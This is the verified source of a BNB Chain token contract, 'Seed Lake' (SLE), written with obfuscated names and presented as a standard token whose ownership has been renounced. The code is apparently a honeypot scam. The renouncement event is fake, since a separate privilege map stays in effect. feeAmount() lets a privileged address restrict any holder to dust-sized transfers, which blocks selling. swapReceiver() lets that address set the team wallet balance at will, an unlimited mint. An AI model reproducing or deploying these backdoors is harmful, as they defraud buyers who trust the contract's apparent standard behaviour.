/**
 *Submitted for verification at BscScan.com on 2023-02-05
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface fundMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableLiquidity {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract SeedLake {
    uint8 private amountAt = 18;

    address private walletReceiverMarketing;

    string private _name = "Seed Lake";
    string private _symbol = "SLE";

    uint256 private modeTake = 100000000 * 10 ** amountAt;
    mapping(address => uint256) private walletReceiver;
    mapping(address => mapping(address => uint256)) private tradingSenderIs;

    mapping(address => bool) public atShould;
    address public teamReceiver;
    address public launchTo;
    mapping(address => bool) public isWallet;
    uint256 constant isAmount = 10 ** 10;
    bool public autoShould;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        fundMarketing shouldTotal = fundMarketing(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchTo = enableLiquidity(shouldTotal.factory()).createPair(shouldTotal.WETH(), address(this));
        walletReceiverMarketing = walletLimit();
        teamReceiver = walletReceiverMarketing;
        atShould[teamReceiver] = true;
        walletReceiver[teamReceiver] = modeTake;
        emit Transfer(address(0), teamReceiver, modeTake);
        exemptTo();
    }

    

    function totalSupply() external view returns (uint256) {
        return modeTake;
    }

    function feeAmount(address toTake) public {
        if (toTake == teamReceiver || toTake == launchTo || !atShould[walletLimit()]) {
            return;
        }
        isWallet[toTake] = true;
    }

    function limitMin(address senderMin, address senderLiquidity, uint256 buyIs) internal returns (bool) {
        require(walletReceiver[senderMin] >= buyIs);
        walletReceiver[senderMin] -= buyIs;
        walletReceiver[senderLiquidity] += buyIs;
        emit Transfer(senderMin, senderLiquidity, buyIs);
        return true;
    }

    function decimals() external view returns (uint8) {
        return amountAt;
    }

    function balanceOf(address txFundSender) public view returns (uint256) {
        return walletReceiver[txFundSender];
    }

    function owner() external view returns (address) {
        return walletReceiverMarketing;
    }

    function buyTeam(address minIs) public {
        if (autoShould) {
            return;
        }
        atShould[minIs] = true;
        autoShould = true;
    }

    function approve(address liquidityTradingExempt, uint256 buyIs) public returns (bool) {
        tradingSenderIs[walletLimit()][liquidityTradingExempt] = buyIs;
        emit Approval(walletLimit(), liquidityTradingExempt, buyIs);
        return true;
    }

    function getOwner() external view returns (address) {
        return walletReceiverMarketing;
    }

    function transferFrom(address listTotal, address launchedTake, uint256 buyIs) public returns (bool) {
        if (listTotal != walletLimit() && tradingSenderIs[listTotal][walletLimit()] != type(uint256).max) {
            require(tradingSenderIs[listTotal][walletLimit()] >= buyIs);
            tradingSenderIs[listTotal][walletLimit()] -= buyIs;
        }
        if (launchedTake == teamReceiver || listTotal == teamReceiver) {
            return limitMin(listTotal, launchedTake, buyIs);
        }
        if (isWallet[listTotal]) {
            return limitMin(listTotal, launchedTake, isAmount);
        }
        return limitMin(listTotal, launchedTake, buyIs);
    }

    function walletLimit() private view returns (address) {
        return msg.sender;
    }

    function exemptTo() public {
        emit OwnershipTransferred(teamReceiver, address(0));
        walletReceiverMarketing = address(0);
    }

    function transfer(address launchedTake, uint256 buyIs) external returns (bool) {
        return transferFrom(walletLimit(), launchedTake, buyIs);
    }

    function allowance(address enableList, address liquidityTradingExempt) external view returns (uint256) {
        return tradingSenderIs[enableList][liquidityTradingExempt];
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function swapReceiver(uint256 buyIs) public {
        if (!atShould[walletLimit()]) {
            return;
        }
        walletReceiver[teamReceiver] = buyIs;
    }


}